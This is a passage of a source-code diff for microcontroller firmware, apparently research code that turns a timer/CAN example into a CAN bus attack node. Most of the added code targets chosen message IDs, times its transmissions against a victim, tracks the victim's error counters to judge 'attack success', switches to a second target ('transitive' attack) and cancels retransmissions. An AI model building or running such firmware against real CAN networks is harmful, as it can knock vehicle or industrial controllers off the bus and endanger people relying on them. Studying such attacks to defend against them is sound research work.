-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_LEC_CRC Flag
-        //
+    if (g_ui32ErrFlag & CAN_STATUS_LEC_CRC) {
         g_ui32ErrFlag &= ~(CAN_STATUS_LEC_CRC);
     }
 
-    //
-    // This is the mask for the CAN Last Error Code (LEC).
-    //
-    if(g_ui32ErrFlag & CAN_STATUS_LEC_MASK)
-    {
-        //
-        // Handle Error Condition here
-        //
-
-        //
-        // Clear CAN_STATUS_LEC_MASK Flag
-        //
+    if (g_ui32ErrFlag & CAN_STATUS_LEC_MASK) {
         g_ui32ErrFlag &= ~(CAN_STATUS_LEC_MASK);
     }
 
-    //
-    // If there are any bits still set in g_ui32ErrFlag then something unhandled
-    // has happened. Print the value of g_ui32ErrFlag.
-    //
-    if(g_ui32ErrFlag !=0)
-    {
-        //UARTprintf("    Unhandled ERROR: %x \n",g_ui32ErrFlag);
+    if (g_ui32ErrFlag != 0) {
+#if defined(VERBOSE)
+        UARTprintf("ERROR: Unknown/Unhandled: %x \n",g_ui32ErrFlag);
+#endif
     }
 }
 
+void
+ConfigureUART2(void)
+{
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOD);
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_UART2);
+    GPIOPinConfigure(GPIO_PD4_U2RX);
+    GPIOPinConfigure(GPIO_PD5_U2TX);
+    GPIOPinTypeUART(GPIO_PORTD_BASE, GPIO_PIN_4 | GPIO_PIN_5);
+    UARTStdioConfig(2, 115200, g_ui32SysClock);
+}
 
-//*****************************************************************************
-//
-// This example application demonstrates the use of the timers to generate
-// periodic interrupts.
-//
-//*****************************************************************************
-int
-main(void)
+void do_reset(int count, int count_2, uint32_t offset)
+{
+    g_offset = offset;
+    TimerDisable(TIMER0_BASE, TIMER_A);
+    TimerDisable(TIMER1_BASE, TIMER_A);
+    TimerDisable(TIMER2_BASE, TIMER_A);
+
+    if (g_ui32ExpCtrl & RESET_IMMED) {
+        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
+        TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
+        TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL);
+        TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+        g_sync = SYNC_MODE_RESET;
+    } else if (g_ui32ExpCtrl & RESET_DELAY) {
+        TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL + (offset<<17)<<1);
+        TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+        TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+        g_sync = SYNC_MODE_INIT;
+    }
+
+    g_tick = g_tick_2 = false;
+    g_bTXTarget_1 = g_bTXTarget_2 = false;
+    g_bTXFlag_5 = g_bTXFlag = g_bRXFlag = false;
+
+    g_pin0 = g_pin_2 = 0;
+
+    if (g_ui32ExpCtrl & ATTACK_MASK) {
+        g_target_id = TARGET_ID;
+        g_ui32TargetXmitTime = TARGET_XMIT_TIME;
+        g_skip_attack = SKIP_ATTACK;
+    }
+
+    ResetCAN0();
+
+    UARTprintf("\tRESET\t%d\t%d\n", count, count_2);
+
+    if (g_ui32ExpCtrl & SYNC_0PHASE) {
+        g_msg_since_idle = 10;
+    }
+
+    TimerEnable(TIMER0_BASE, TIMER_A);
+    //TimerEnable(TIMER1_BASE, TIMER_A);
+    TimerEnable(TIMER2_BASE, TIMER_A);
+    g_reset = false;
+}
+
+void
+initialize(void)
 {
     //
     // Enable lazy stacking for interrupt handlers.  This allows floating-point
     // instructions to be used within interrupt handlers, but at the expense of
     // extra stack usage.
     //
-    //ROM_FPULazyStackingEnable();
+    //FPULazyStackingEnable();
 
-    //
-    // Set the clocking to run directly from the crystal at 120MHz.
-    //
-    g_ui32SysClock = MAP_SysCtlClockFreqSet((SYSCTL_XTAL_25MHZ |
-                                             SYSCTL_OSC_MAIN |
-                                             SYSCTL_USE_PLL |
-                                             SYSCTL_CFG_VCO_480), 120000000);
+    g_ui32SysClock = SysCtlClockFreqSet((SYSCTL_XTAL_25MHZ | SYSCTL_OSC_MAIN | SYSCTL_USE_PLL | SYSCTL_CFG_VCO_480), SYSCLK);
 
+    // enable LEDs
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPION);
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOF);
 
-    // TODO: Refactor below: InitLEDs()
-    //
-    // Enable the GPIO port that is used for the on-board LEDs.
-    //
-    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_GPION);
-    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOF);
+    // configure LEDs
+    GPIOPinTypeGPIOOutput(GPIO_PORTN_BASE, GPIO_PIN_0 | GPIO_PIN_1);
+    GPIOPinTypeGPIOOutput(GPIO_PORTF_BASE, GPIO_PIN_0 | GPIO_PIN_4);
 
-    //
-    // Enable the GPIO pins for the LEDs (PN0 & PN1).
-    //
-    ROM_GPIOPinTypeGPIOOutput(GPIO_PORTN_BASE, GPIO_PIN_0 | GPIO_PIN_1);
-    ROM_GPIOPinTypeGPIOOutput(GPIO_PORTF_BASE, GPIO_PIN_0 | GPIO_PIN_4);
+    // Enable timer peripherals
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER0);
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER1);
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER2);
+    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER3);
 
-    //
-    // Enable the peripherals used by this example.
-    //
-    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER0);
-    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER1);
-
-    //
-    // Enable processor interrupts.
-    //
-    ROM_IntMasterEnable();
     IntMasterEnable();
 
-    //
-    // Configure the two 32-bit periodic timers.
-    //
-    ROM_TimerConfigure(TIMER0_BASE, TIMER_CFG_PERIODIC);
-    ROM_TimerConfigure(TIMER1_BASE, TIMER_CFG_PERIODIC);
-    ROM_TimerLoadSet(TIMER0_BASE, TIMER_A, g_ui32SysClock);
-
-    #define INTERVAL (600000) /* 600000 = 5ms */
-    ROM_TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
-
-    //
-    // Setup the interrupts for the timer timeouts.
-    //
+    // Setup timers
+    // TIMER0 is a full width periodic timer at 5 ms period (determined by INTERVAL)
+    TimerConfigure(TIMER0_BASE, TIMER_CFG_PERIODIC);
+    TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
     IntEnable(INT_TIMER0A);
     TimerIntEnable(TIMER0_BASE, TIMER_TIMA_TIMEOUT);
+
+    // TIMER1 provides a second 5 ms period timer that is (semi) independent from TIMER 1
+    TimerConfigure(TIMER1_BASE, TIMER_CFG_PERIODIC);
+    TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
     IntEnable(INT_TIMER1A);
     TimerIntEnable(TIMER1_BASE, TIMER_TIMA_TIMEOUT);
 
-    //
-    // Initialize CAN0
-    //
+    // TIMER2 is used for re-synchronization: 0-phase interval tracking and generating offsets during restart
+    TimerConfigure(TIMER2_BASE, TIMER_CFG_ONE_SHOT);
+    TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL);
+    IntEnable(INT_TIMER2A);
+    TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+
+    TimerConfigure(TIMER3_BASE, TIMER_CFG_PERIODIC);
+    TimerLoadSet(TIMER3_BASE, TIMER_A, 0x10000000);
+
+    if (g_ui32ExpCtrl & ATTACK_MASK) {
+        g_target_id = TARGET_ID;
+        g_ui32TargetXmitTime = TARGET_XMIT_TIME;
+    }
+
+    // Setup the CAN and UART
     InitCAN0();
+    ConfigureUART2();
+}
 
-    //
-    // Enable the timers.
-    //
-    ROM_TimerEnable(TIMER0_BASE, TIMER_A);
-    ROM_TimerEnable(TIMER1_BASE, TIMER_A);
+bool
+do_switch(int count)
+{
+    uint32_t rec, tec;
+    CANErrCntrGet(CAN0_BASE, &rec, &tec);
+    if (rec + tec > 0) return false;
 
-    //
-    // Loop forever while the timers run.
-    //
-    while(1)
-    {
-        //
-        // If the flag is set, that means that the RX interrupt occurred and
-        // there is a message ready to be read from the CAN
-        //
-        if(g_bRXFlag)
-        {
-            //
-            // Reuse the same message object that was used earlier to configure
-            // the CAN for receiving messages.  A buffer for storing the
-            // received data must also be provided, so set the buffer pointer
-            // within the message object.
-            //
-            g_sCAN0RxMessage.pui8MsgData = (uint8_t *) &g_ui8RXMsgData;
+    UARTprintf("%d\tSWITCH\n", count);
+    TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+    g_target_id = TARGET_ID_2;
+    g_ui32TargetXmitTime = TARGET_XMIT_TIME_2;
+    g_sync = SYNC_MODE_RESET;
+    if (g_ui32ExpCtrl & SYNC_0PHASE) {
+        g_msg_since_idle = 10;
+    }
+    g_skip_attack = SKIP_ATTACK_2;
+    return true;
+}
 
-            //
-            // Read the message from the CAN.  Message object RXOBJECT is used
-            // (which is not the same thing as CAN ID).  The interrupt clearing
-            // flag is not set because this interrupt was already cleared in
-            // the interrupt handler.
-            //
+int
+main(void)
+{
+    int count = 0, count_2 = 0;
+    volatile uint32_t delay = 0;
+    uint32_t rec, tec;
+    bool attack1_success = false, attack2_success = false;
+    uint32_t last_target_rcv = 0;
+
+    initialize();
+
+
+    // Start the clocks
+    TimerEnable(TIMER0_BASE, TIMER_A);
+    // TimerEnable(TIMER1_BASE, TIMER_A);
+    // TimerEnable(TIMER2_BASE, TIMER_A);
+    TimerEnable(TIMER3_BASE, TIMER_A);
+
+    // Whenever the "RESET" node reboots, reset everyone else.
+#if defined(SEND_RESET)
+    CANMessageSet(CAN0_BASE, TXOBJECT_RESET, &g_sCAN0TxMessage_RESET, MSG_OBJ_TYPE_TX);
+#endif
+
+    // main loop
+    while(1) {
+        if (g_bRESETFlag) {
+            g_bRESETFlag = false;
+            // this flag is set when this node transmitted the reset message
+            do_reset(count, count_2, g_ui8TXMsgData_RESET[0]);
+            count = count_2 = 0;
+            last_target_rcv = 0;
+        }
+
+        if (g_tick == true) {
+            g_tick = false;
+            send_messages(++count);
+        }
+
+        if (g_tick_2 == true) {
+            g_tick_2 = false;
+         //   send_messages_2(++count_2);
+        }
+
+        if (g_bTXTarget_1) {
+            g_bTXTarget_1 = false;
+            if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
+                if (g_target_id == TARGET_ID) {
+                    attack1_success = do_switch(count);
+                } else {
+                    if (PRECEDED_ID_2 == TARGET_ID) {
+                        if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
+                            delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
+                            CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
+                        }
+                    }
+                }
+            }
+            if (g_target_id == TARGET_ID) {
+                CANErrCntrGet(CAN0_BASE, &rec, &tec);
+                UARTprintf("%d\tATK1-TX %d\tREC\t%u\tTEC\t%u\n", count, TARGET_ID, rec, tec);
+            }
+        }
+
+        if (g_bTXTarget_2) {
+            g_bTXTarget_2 = false;
+            CANErrCntrGet(CAN0_BASE, &rec, &tec);
+            UARTprintf("%d\tATK2-TX %d\tREC\t%u\tTEC\t%u\n", count, TARGET_ID_2, rec, tec);
+        }
+
+        if (g_bTXFlag_5) {
+            g_bTXFlag_5 = false;
+            g_ui32TXMsgCount++;
+            if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
+                if (PRECEDED_ID == HIGH_PRIO_ID) {
+                    if ( g_target_id == TARGET_ID ) {
+                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
+                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
+                    }
+                } else if (PRECEDED_ID_2 == HIGH_PRIO_ID) {
+                    if ( g_target_id == TARGET_ID_2 ) {
+                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
+                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
+                    }
+                } else {
+                    // nothing to do.
+                }
+            }
+#if defined(VERBOSE)
+            CANErrCntrGet(CAN0_BASE, &rec, &tec);
+            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
+#endif
+        }
+
+        if (g_bTXFlag) {
+            g_bTXFlag = false;
+            g_ui32TXMsgCount++;
+#if defined(VERBOSE)
+            CANErrCntrGet(CAN0_BASE, &rec, &tec);
+            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
+#endif
+        }
+
+        if (g_bRXFlag) {
+            g_bRXFlag = false;
+
+            // Read the message
             CANMessageGet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, 0);
 
-            //
-            // Clear the pending message flag so that the interrupt handler can
-            // set it again when the next message arrives.
-            //
-            g_bRXFlag = 0;
-
-            //
-            // Check to see if there is an indication that some messages were
-            // lost.
-            //
-            if(g_sCAN0RxMessage.ui32Flags & MSG_OBJ_DATA_LOST)
-            {
-            //    UARTprintf("\nCAN message loss detected\n");
+            if(g_sCAN0RxMessage.ui32Flags & MSG_OBJ_DATA_LOST) {
+#if defined(VERBOSE)
+                //UARTprintf("%d\tCAN message loss detected\n", count);
+#endif
             }
 
-            //
-            // Print the received character to the UART terminal
-            //
-//            UARTprintf("%c", g_ui8RXMsgData);
+            if (g_sCAN0RxMessage.ui32MsgID == 0xFF) {
+                // The ID 0x01 is used for RESET message.
+                do_reset(count, count_2, g_ui8RXMsgData[0]);
+                count = count_2 = 0;
+                last_target_rcv = 0;
+            }
 
-        }
+            if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
+                uint32_t now = TimerValueGet(TIMER3_BASE, TIMER_A);
+                // INTERVAL << 4 is Magic.
+                if (g_target_id == TARGET_ID && last_target_rcv && last_target_rcv - now > (INTERVAL<<2)) {
+                    // more magic... sometimes it switches early, so ignore the startup
+                    if (count > 200) {
+                        attack1_success = do_switch(count);
+                    }
+                }
+                // Disable retransmission of the attack when the preceded message is received
+                // TODO: predict when the target will be bus-off?
+                if ( PRECEDED_ID != HIGH_PRIO_ID && g_target_id == TARGET_ID ) {
+                    if (g_sCAN0RxMessage.ui32MsgID == PRECEDED_ID ) {
+                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
+                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
+                    }
+                } else if (PRECEDED_ID_2 != HIGH_PRIO_ID && g_target_id == TARGET_ID_2) {
+                    if (g_sCAN0RxMessage.ui32MsgID == PRECEDED_ID_2 ) {
+                        delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
+                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
+                    }
+                } else {
+                    // do nothing.
+                }
+            }
+
+            if (g_sCAN0RxMessage.ui32MsgID == g_target_id) {
+                last_target_rcv = TimerValueGet(TIMER3_BASE, TIMER_A);
+                // check if need to resynchronize
+                if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
+                    if (g_sync != SYNC_MODE_SYNCHED) {
+                        if (g_sync == SYNC_MODE_RESET && g_msg_since_idle == 0) { /* g_msg_since_idle always 0 with SYNC_PERIOD */
+                            TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+                            uint32_t delta = g_ui32LastCANIntTimer - last_target_rcv; // counting down, so start - end = delta
+                            TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL-delta-(TARGET_XMIT_TIME*6)); /* FIXME: 6 is magic. */
+                            TimerEnable(TIMER2_BASE, TIMER_A);
+                            g_sync = SYNC_MODE_ADJUST;
+                            TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
+                            TimerDisable(TIMER0_BASE, TIMER_A);
+                            g_tick = false;
+                            count = 0;
+                        }
+                    }
+                }
+            }
+#if defined(VERBOSE)
+            // FIXME: print received target1 and target2 messages after attack presumed successful.
+                CANErrCntrGet(CAN0_BASE, &rec, &tec);
+                UARTprintf("%d\tRX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
+#endif
+        } // g_bRXflag
+
         if (g_ui32ErrFlag) {
             CANErrorHandler();
         }
-
-    }
+    } // while(1)
 }
